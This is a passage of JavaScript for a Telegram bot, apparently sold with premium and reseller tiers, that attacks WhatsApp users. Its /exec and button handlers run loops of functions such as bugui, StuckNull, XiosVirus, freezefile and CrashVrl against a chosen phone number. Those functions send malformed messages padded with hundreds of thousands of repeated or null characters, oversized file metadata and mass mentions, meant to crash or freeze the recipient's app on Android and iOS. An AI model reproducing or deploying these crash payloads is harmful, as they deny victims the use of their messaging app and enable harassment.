      { text: "CrashZ", callback_data: `core_${target}` },
            { text: "Xcore", callback_data: `trash_${target}` }
      ],
    [
      { text: "Type IOS", callback_data: `lanjut_${target}` }
    ]
  ];
  const loadingImageUrl = "https://cdn.obscura.web.id/Cat.jpg";
  await ctx.editMessageCaption(`╭─────「 ƿᎡ᥆ƈҽʂᎦꀤꋊ𝔾 」
│⇲ Click One Of The Buttons
╰─────────────────────⊹`, {
    photo: loadingImageUrl,
    reply_markup: {
      inline_keyboard: buttons
    }
  });
});
bot.action(/core_(.+)/, async (ctx) => {
  const target = ctx.match[1];
  if (!userHasRunTes.has(ctx.from.id) || userHasRunTes.get(ctx.from.id) !== target) {
    await ctx.answerCbQuery("Anda harus menjalankan perintah /exec terlebih dahulu.", { show_alert: true });
    return;
  }
  await ctx.answerCbQuery("Memulai pengiriman bug untuk Core...");
  const loadingImageUrl = "https://cdn.obscura.web.id/Cat.jpg";
  try {
    await ctx.editMessageCaption("Mengirim bug Core... Mohon tunggu", {
      photo: loadingImageUrl,
    });
    for (let i = 0; i < 5; i++) {
      await BugMain(target)
        await InvisibleLoadFast(target);
        await bugnew(target);
        await InvisibleLoadFast(target);
        await bugnew(target);
        await bugnew(target)
        await bugnew(target);
    }
    userHasRunTes.delete(ctx.from.id);
    return await ctx.editMessageCaption(`Bug successfully submitted to ${target}.`, {
      photo: loadingImageUrl,
      reply_markup: {
        inline_keyboard: [
          [
            { text: "Developer", url: "https://t.me/@DelioGalileio" }
          ]
        ]
      }
    });
  } catch (error) {
    console.error("Terjadi kesalahan saat mengirim bug:", error);
    await ctx.editMessageCaption("Terjadi kesalahan saat mengirim bug. Coba lagi.", {
      photo: loadingImageUrl,
    });
  }
});
bot.action(/trash_(.+)/, async (ctx) => {
  const target = ctx.match[1];
  if (!userHasRunTes.has(ctx.from.id) || userHasRunTes.get(ctx.from.id) !== target) {
    await ctx.answerCbQuery("Anda harus menjalankan perintah /exec terlebih dahulu.", { show_alert: true });
    return;
  }
  await ctx.answerCbQuery("Memulai pengiriman bug untuk Trash...");
  const loadingImageUrl = "https://cdn.obscura.web.id/Cat.jpg";
  try {
    await ctx.editMessageCaption("Mengirim bug Trash... Mohon tunggu", {
      photo: loadingImageUrl,
    });
    for (let i = 0; i < 2; i++) {
          await CrashOld(target);
        await systemUi(target)
        await systemUi(target)
        await systemUi2(target);
        await CrashOld(target);
        await InvisibleLoadFast(target);
        await CrashOld(target);
        await thunderblast_doc(target)
        await thunderblast_doc(target);
        await BugMain(target);
        await InvisibleLoadFast(target);
        await crashUiV5(target);
        await systemUi2(target);
        await systemUi(target);
        await thunderblast_doc(target)
        await thunderblast_doc(target);
        await buginvite(target, Ptcp = true);
        await buginvite(target, Ptcp = true);
        await BugMain(target)
        await InvisibleLoadFast(target);
        await CrashOld(target);
        await InvisibleLoadFast(target);
        await CrashOld(target);
        await BugMain(target)
        await BugMain(target);
    }
    userHasRunTes.delete(ctx.from.id);
    return await ctx.editMessageCaption(`Bug successfully submitted to ${target}.`, {
      photo: loadingImageUrl,
      reply_markup: {
        inline_keyboard: [
          [
            { text: "King", url: "https://t.me/@DelioGalileio" }
          ]
        ]
      }
    });
  } catch (error) {
    console.error("Terjadi kesalahan saat mengirim bug:", error);
    await ctx.editMessageCaption("Terjadi kesalahan saat mengirim bug. Coba lagi.", {
      photo: loadingImageUrl,
    });
  }
});
//=========FUNC IOS=========\\
bot.action(/iosx_(.+)/, async (ctx) => {
  const target = ctx.match[1];
  if (!userHasRunTes.has(ctx.from.id) || userHasRunTes.get(ctx.from.id) !== target) {
    await ctx.answerCbQuery("Anda harus menjalankan perintah /exec terlebih dahulu.", { show_alert: true });
    return;
  }
  await ctx.answerCbQuery("Memulai pengiriman IosX...");
  const loadingImageUrl = "https://cdn.obscura.web.id/Cat.jpg";
  try {
    await ctx.editMessageCaption("Mengirim bug IosX... Mohon tunggu", {
      photo: loadingImageUrl,
    });
    for (let i = 0; i < 8; i++) {
await IosMJ(target, true);
        await XiosVirus(target);
        await QDIphone(target);
        await QPayIos(target);
        await QPayStriep(target);
        await FBiphone(target);
        await VenCrash(target);
        await AppXCrash(target);
        await SmCrash(target);
        await SqCrash(target);
        await IosMJ(target, true);
        await XiosVirus(target);
    }
    userHasRunTes.delete(ctx.from.id);
    return await ctx.editMessageCaption(`Bug successfully submitted to ${target}.`, {
      photo: loadingImageUrl,
      reply_markup: {
        inline_keyboard: [
          [
            { text: "King", url: "https://t.me/@DelioGalileio" }
          ]
        ]
      }
    });
  } catch (error) {
    console.error("Terjadi kesalahan saat mengirim bug:", error);
    await ctx.editMessageCaption("Terjadi kesalahan saat mengirim bug. Coba lagi.", {
      photo: loadingImageUrl,
    });
  }
});
bot.action(/xis_(.+)/, async (ctx) => {
  const target = ctx.match[1];
  if (!userHasRunTes.has(ctx.from.id) || userHasRunTes.get(ctx.from.id) !== target) {
    await ctx.answerCbQuery("Anda harus menjalankan perintah /exec terlebih dahulu.", { show_alert: true });
    return;
  }
  await ctx.answerCbQuery("Memulai pengiriman XiS...");
  const loadingImageUrl = "https://cdn.obscura.web.id/Cat.jpg";
  try {
    await ctx.editMessageCaption("Mengirim bug XiS... Mohon tunggu", {
      photo: loadingImageUrl,
    });
    for (let i = 0; i < 8; i++) {
      await IosMJ(target, true);
        await XiosVirus(target);
        await QDIphone(target);
        await QPayIos(target);
        await QPayStriep(target);
        await FBiphone(target);
        await VenCrash(target);
        await AppXCrash(target);
        await SmCrash(target);
        await SqCrash(target);
        await IosMJ(target, true);
        await XiosVirus(target);
    }
    userHasRunTes.delete(ctx.from.id);
    return await ctx.editMessageCaption(`Bug successfully submitted to ${target}.`, {
      photo: loadingImageUrl,
      reply_markup: {
        inline_keyboard: [
          [
            { text: "King", url: "https://t.me/@DelioGalileio" }
          ]
        ]
      }
    });
  } catch (error) {
    console.error("Terjadi kesalahan saat mengirim bug:", error);
    await ctx.editMessageCaption("Terjadi kesalahan saat mengirim bug. Coba lagi.", {
      photo: loadingImageUrl,
    });
  }
});
bot.start(async (ctx) => {
  await ctx.telegram.sendChatAction(ctx.chat.id, 'typing');
  const isPremium = isPremiumUser(ctx.from.id);
  const isAdminStatus = isAdmin(ctx.from.id);
  const isOwnerStatus = isOwner(ctx.from.id);
  const mainMenuMessage = `
╭───「 𝙸𝚗𝚏𝚘 𝙲𝚛𝚎𝚊𝚝𝚘𝚛 」
│〣 ᴄʀᴇᴀᴛᴏʀ : @DelioGalileio
╰──────────────────⊹
╭───「 𝚂𝚝𝚊𝚝𝚞𝚜 - 𝚄𝚜𝚎𝚛 」
│ *◎* *Owner* : ${isOwnerStatus ? '✅' : '❌'}
│ *◎* *Admin* : ${isAdminStatus ? '✅' : '❌'}
│ *◎* *Premium* : ${isPremium ? '✅' : '❌'}
╰─────────────────────⊹
╭───「 𝘽𝙐𝙂 𝙈𝙀𝙉𝙐 」
│◎  /exec *<Button Select>*
│◎  /resellermenu *<Database Script>*
╰─────────────────────⊹

`;
const mainKeyboard = [
  [
    { text: "Dev Menu", callback_data: "developercmd" },
    { text: "Owner Menu", callback_data: "owneronli" }
  ],
  [
    { text: "Admin Menu", callback_data: "admincmd" }
  ],
  [
    { text: "Contact Owner", url: "https://t.me/DelioGalileio" }
  ]
];
  setTimeout(async () => {
    await ctx.replyWithPhoto("https://cdn.obscura.web.id/Cat.jpg", {
      caption: mainMenuMessage,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: mainKeyboard
      }
    });
  }, 3000); 
});
bot.action('developercmd', async (ctx) => {
  
  try {
    await ctx.deleteMessage();
  } catch (error) {
    console.error("Error deleting message:", error);
  }
  const ownerMenuMessage = `
╭━━━━━━━━━━━━━━━━━━━━━❍
┃ ◎ /addowner - add to db 
┃ ◎ /delowner - delete owner
┃ ◎ /cekusersc - cek pengguna sc
┃ ◎ /monitoruser - monitoring
┃ ◎ /addpairing - connect to wa
┃ ◎ /addtoken - TokenUser
┃ ◎ /maintenance - true / false
╰━━━━━━━━━━━━━━━━━━━━━❍
  `;
  const ownerKeyboard = [
    [{
      text: "🔙",
      callback_data: "main_menu"
    }]
  ];
  
  setTimeout(async () => {
    await ctx.replyWithPhoto("https://cdn.obscura.web.id/Cat.jpg", {
      caption: ownerMenuMessage,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: ownerKeyboard
      }
    });
  }, 3000); 
});
bot.action('admincmd', async (ctx) => {
  
  try {
    await ctx.deleteMessage();
  } catch (error) {
    console.error("Error deleting message:", error);
  }
  const ResellerMenu = `
╭━━━━━━━━━━━━━━━━━━━━━━❍
┃ ◎ /addprem - premium features
┃ ◎ /delprem - remove premium
╰━━━━━━━━━━━━━━━━━━━━━━❍
  `;
  const ownerKeyboard = [
    [{
      text: "🔙",
      callback_data: "main_menu"
    }]
  ];
  
  setTimeout(async () => {
    await ctx.replyWithPhoto("https://cdn.obscura.web.id/Cat.jpg", {
      caption: ResellerMenu,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: ownerKeyboard
      }
    });
  }, 3000); 
});
bot.action('owneronli', async (ctx) => {
  await ctx.deleteMessage();
  const obfMenu = `
╭━━━━━━━━━━━━━━━━━━━━━❍
┃◎ /addadmin - unlock addprem
┃◎ /deladmin - premium features
┃◎ /cekusersc - cek pengguna sc
┃◎ /monitoruser - monitoring
┃◎ /addpairing - connect to wa
╰━━━━━━━━━━━━━━━━━━━━━❍
  `;
  const ownerKeyboard = [
    [{
      text: "🔙",
      callback_data: "main_menu"
    }]
  ];
  setTimeout(async () => {
    await ctx.replyWithPhoto("https://cdn.obscura.web.id/Cat.jpg", {
      caption: obfMenu,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: ownerKeyboard
      }
    });
  }, 3000); 
});
bot.action('main_menu', async (ctx) => {
  await ctx.deleteMessage();
  const isPremium = isPremiumUser(ctx.from.id);
  const isAdminStatus = isAdmin(ctx.from.id);
  const isOwnerStatus = isOwner(ctx.from.id);
  const mainMenuMessage = `
╭───「 𝙸𝚗𝚏𝚘 𝙲𝚛𝚎𝚊𝚝𝚘𝚛 」
│〣 ᴄʀᴇᴀᴛᴏʀ : @DelioGalileio
╰──────────────────⊹
╭───「 𝚂𝚝𝚊𝚝𝚞𝚜 - 𝚄𝚜𝚎𝚛 」
│ *◎* *Owner* : ${isOwnerStatus ? '✅' : '❌'}
│ *◎* *Admin* : ${isAdminStatus ? '✅' : '❌'}
│ *◎* *Premium* : ${isPremium ? '✅' : '❌'}
╰─────────────────────⊹
╭───「 Type Menu 」
│◎  /exec *<Button Select>*
│◎  /resellermenu *<Database Script>*
╰─────────────────────⊹
`;
  const mainKeyboard = [
[
    { text: "Dev Menu", callback_data: "developercmd" },
    { text: "Owner Menu", callback_data: "owneronli" }
  ],
  [
    { text: "Admin Menu", callback_data: "admincmd" }
  ],
  [
    { text: "Contact Owner", url: "https://t.me/DelioGalileio" }
  ]
];
  ctx.replyWithPhoto("https://cdn.obscura.web.id/Cat.jpg", {
      caption: mainMenuMessage,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: mainKeyboard
      }
    });
});
bot.command('addtoken', (ctx) => {
    ctx.reply('Kirimkan token Telegram yang ingin Anda tambahkan:');
    bot.on('text', async (ctx) => {
        const newToken = ctx.message.text;
        try {
            const { sha } = await getTokenDatabase();
            const result = await updateTokenDatabase(newToken, sha);
            if (result.success) {
                ctx.reply('✅ ' + result.message);
            } else {
                ctx.reply('⚠️ ' + result.message);
            }
        } catch (error) {
            ctx.reply('❌ Terjadi kesalahan saat menambahkan token.');
        }
    });
});
async function Fuckui(target) {
  try {
    let message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: [target],
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: target,
              },
            },
            body: {
              text: "FUCK UI",
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
              ],
            },
          },
        },
      },
    };
    await sock.relayMessage(target, message, {
      participant: { jid: target },
    });
  } catch (err) {
    console.log(err);
  }
}
async function InvisibleLoadFast(target) {
      try {
        let message = {
          viewOnceMessage: {
            message: {
              messageContextInfo: {
                deviceListMetadata: {},
                deviceListMetadataVersion: 2,
              },
              interactiveMessage: {
                contextInfo: {
                  mentionedJid: [target],
                  isForwarded: true,
                  forwardingScore: 999,
                  businessMessageForwardInfo: {
                    businessOwnerJid: target,
                  },
                },
                body: {
                  text: "P",
                },
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "single_select",
                      buttonParamsJson: "",
                    },
                    {
                      name: "call_permission_request",
                      buttonParamsJson: "",
                    },
                    {
                      name: "mpm",
                      buttonParamsJson: "",
                    },
                    {
                      name: "mpm",
                      buttonParamsJson: "",
                    },
                    {
                      name: "mpm",
                      buttonParamsJson: "",
                    },
                    {
                      name: "mpm",
                      buttonParamsJson: "",
                    },
                  ],
                },
              },
            },
          },
        };
        await sock.relayMessage(target, message, {
          participant: { jid: target },
        });
      } catch (err) {
        console.log(err);
      }
    }
		const EsQl = {
			key: {
				remoteJid: 'p',
				fromMe: false,
				participant: '0@s.whatsapp.net'
			},
			message: {
				"interactiveResponseMessage": {
					"body": {
						"text": "Sent",
						"format": "DEFAULT"
					},
					"nativeFlowResponseMessage": {
						"name": "galaxy_message",
						"paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"𝐑𝐚𝐝𝐢𝐭 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"RaditX7\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"⭑̤⟅̊༑ ▾ 𝐙͢𝐍ͮ𝐗 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤${"\u0003".repeat(350000)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
						"version": 3
					}
				}
			}
		}
async function bugui(target, ThM, cct = false, ptcp = false) {
			let etc = generateWAMessageFromContent(target,
				proto.Message.fromObject({
					viewOnceMessage: {
						message: {
							interactiveMessage: {
								header: {
									title: "",
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 9007199254740991,
										mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
										fileName: "🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠",
										fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
										directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1723855952",
										contactVcard: true,
										thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
										thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
										thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
										jpegThumbnail: ThM
									},
									hasMediaAttachment: true
								},
								body: {
									text: "PrelXz"
								},
								nativeFlowMessage: {
									messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" # trashdex - explanation \",\"body\":\"xxx\"}",
									buttons: [
										cct ? {
											name: "single_select",
											buttonParamsJson: "{\"title\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉" + "᬴".repeat(0) + "\",\"sections\":[{\"title\":\"𝐑𝐚𝐝𝐢𝐭 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"rows\":[]}]}"
										} : {
											name: "payment_method",
											buttonParamsJson: ""
										},
										{
											name: "call_permission_request",
											buttonParamsJson: "{}"
										},
										{
											name: "payment_method",
											buttonParamsJson: "{}"
										},
										{
											name: "single_select",
											buttonParamsJson: "{\"title\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"sections\":[{\"title\":\"𝐑𝐚𝐝𝐢𝐭 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"rows\":[]}]}"
										},
										{
											name: "galaxy_message",
											buttonParamsJson: "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\"〽️\",\"flow_id\":\"BY DEVORSIXCORE\",\"flow_message_version\":\"9\",\"flow_token\":\"MYPENISMYPENISMYPENIS\"}"
										},
										{
											name: "mpm",
											buttonParamsJson: "{}"
										}
									]
								}
							}
						}
					}
				}), {
					userJid: target,
					quoted: EsQl
				}
			);
			await sock.relayMessage(target, etc.message, ptcp ? {
				participant: {
					jid: target,
				}
			} : {});
			console.log(chalk.green("Send Bug By GetsuzoZhiro🐉"));
		};
async function StuckNull(target, ThM, Ptcp = true) {
			await sock.relayMessage(target, {
					ephemeralMessage: {
						message: {
							interactiveMessage: {
								header: {
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 1316134911,
										mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
										fileName: "NUL",
										fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
										directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1726867151",
										contactVcard: true,
										jpegThumbnail: ThM,
									},
									hasMediaAttachment: true,
								},
								body: {
									text: "Null̤\n" + "@6285655649546".repeat(17000),
								},
								nativeFlowMessage: {
									buttons: [{
											name: "cta_url",
											buttonParamsJson: "{ display_text: '✨⃟༑⌁⃰𝐏𝐫𝐞𝐥 𝐂𝐫𝐚𝐬𝐡 ϟ〽️', url: \"https://youtube.com/PrelXz\", merchant_url: \"https://youtube.com/PrelXz\" }",
										},
										{
											name: "call_permission_request",
											buttonParamsJson: "{}",
										},
									],
									messageParamsJson: "{}",
								},
								contextInfo: {
									mentionedJid: ["6285655649546@s.whatsapp.net"],
									forwardingScore: 1,
									isForwarded: true,
									fromMe: false,
									participant: "0@s.whatsapp.net",
									remoteJid: "status@broadcast",
									quotedMessage: {
										documentMessage: {
											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
											fileLength: "9999999999999",
											pageCount: 1316134911,
											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
											fileName: "𝐏𝐫𝐞𝐥𝐗𝐳 𝐁𝐔𝐆 𝐕𝟐〽️",
											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mediaKeyTimestamp: "1724474503",
											contactVcard: true,
											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
											jpegThumbnail: "",
										},
									},
								},
							},
						},
					},
				},
				Ptcp ? {
					participant: {
						jid: target,
					}
				} : {}
			);
			console.log(chalk.green("Send Bug By PrelXz〽️"));
		};
		async function ClPmNull(target, Qtd, ThM, cct = false, ptcp = true) {
      let etc = generateWAMessageFromContent(
        target,
        proto.Message.fromObject({
          viewOnceMessage: {
            message: {
              interactiveMessage: {
                header: {
                  title: "",
                  documentMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                    mimetype:
                      "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                    fileLength: "9999999999999",
                    pageCount: 9007199254740991,
                    mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
                    fileName: "⿻ Null ⿻",
                    fileEncSha256:
                      "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
                    directPath:
                      "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1723855952",
                    contactVcard: true,
                    thumbnailDirectPath:
                      "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                    thumbnailSha256:
                      "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                    thumbnailEncSha256:
                      "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                    jpegThumbnail: ThM,
                  },
                  hasMediaAttachment: true,
                },
                body: {
                  text: "⭑‌▾ ⿻ NuLl ⿻ ▾⭑" + "ꦾ" + "ꦾ".repeat(77777),
                },
                nativeFlowMessage: {
                  messageParamsJson:
                    '{"name":"galaxy_message","title":"oi","header":" # trashdex - explanation ","body":"xxx"}',
                },
              },
            },
          },
        }),
        {
          userJid: target,
          quoted: Qtd,
        }
      );
      await sock.relayMessage(
        target,
        etc.message,
        ptcp
          ? {
              participant: {
                jid: target,
              },
            }
          : {}
      );
      console.log(chalk.green("Send Bug By ⭑‌▾ ⿻ VrlCrash ⿻ ▾⭑"));
    }
    	async function XiosVirus(jid) {
			sock.relayMessage(jid, {
				'extendedTextMessage': {
					'text': '.',
					'contextInfo': {
						'stanzaId': jid,
						'participant': jid,
						'quotedMessage': {
							'conversation': 'VRL̤' + 'ꦾ'.repeat(50000)
						},
						'disappearingMode': {
							'initiator': "CHANGED_IN_CHAT",
							'trigger': "CHAT_SETTING"
						}
					},
					'inviteLinkGroupTypeV2': "DEFAULT"
				}
			}, {
				'participant': {
					'jid': jid
				}
			}, {
				'messageId': null
			});
			console.log(chalk.green("Send Bug By PrelXz〽️"));
		};
		async function XiosPay(jid) {
			sock.relayMessage(jid, {
				'paymentInviteMessage': {
					'serviceType': "UPI",
					'expiryTimestamp': Date.now() + 86400000
				}
			}, {
				'participant': {
					'jid': jid
				}
			});
			console.log(chalk.green("Send Bug By PrelXz〽️"));
		};
		const callg = {
			key: {
				remoteJid: 'status@broadcast',
				participant: '0@s.whatsapp.net',
				fromMe: false,
			},
			message: {
				callLogMesssage: {
                    isVideo: true,
                    callOutcome: "1",
                    durationSecs: "0",
                    callType: "REGULAR",
                    participants: [{ jid: "0@s.whatsapp.net", callOutcome: "1" }]
                }
			}
		};
const penangkalnya = '᠌\n'.repeat(1000)
const TypeNull = {
key: {
remoteJid: 'p',
fromMe: false,
participant: '0@s.whatsapp.net'
},
message: {
"interactiveResponseMessage": {
"body": {
"text": "Sent",
"format": "DEFAULT"
},
"nativeFlowResponseMessage": {
"name": "galaxy_message",
"paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(500000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
"version": 3
}
}
}
}
async function freezefile(target, ptcp = false) {
    let virtex = "VRLZ" + "@6285655649546".repeat(250000);
    await sock.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: "VRL",
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        title: "",
                        hasMediaAttachment: true
                    },
                    body: {
                        text: virtex
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "anjay" }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
} 
async function CrashVrl(target) {
let etc = generateWAMessageFromContent(target, { viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: "𝐙𝐘𝐕𝐑𝐋 ↯ 𝐈𝐒 𝐇𝐄𝐑𝐄" + "ꦾ".repeat(90000)
          },
          carouselMessage: {
            cards: [
              {    
              header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './thumb.png' } }, { upload: sock.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: "𝐙𝐘𝐕𝐑𝐋 𝐂𝐨𝐫𝐞",
          hasMediaAttachment: false
        }),
                body: {
                  text: "𝐙𝐘𝐕𝐑𝐋 𝐂𝐨𝐫𝐞" + "ꦾ".repeat(90000)
                },
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "cta_url",
                      buttonParamsJson: `{"display_text":"𝗖𝗥𝗔𝗦𝗛 𝗦𝗬𝗦𝗧𝗘𝗠","url":"https://t.me/varelmek","merchant_url":"https://t.me/varelmek"}`
                    },
                  ],
                },
              },
              {
              header: proto.Message.InteractiveMessage.Header.create({
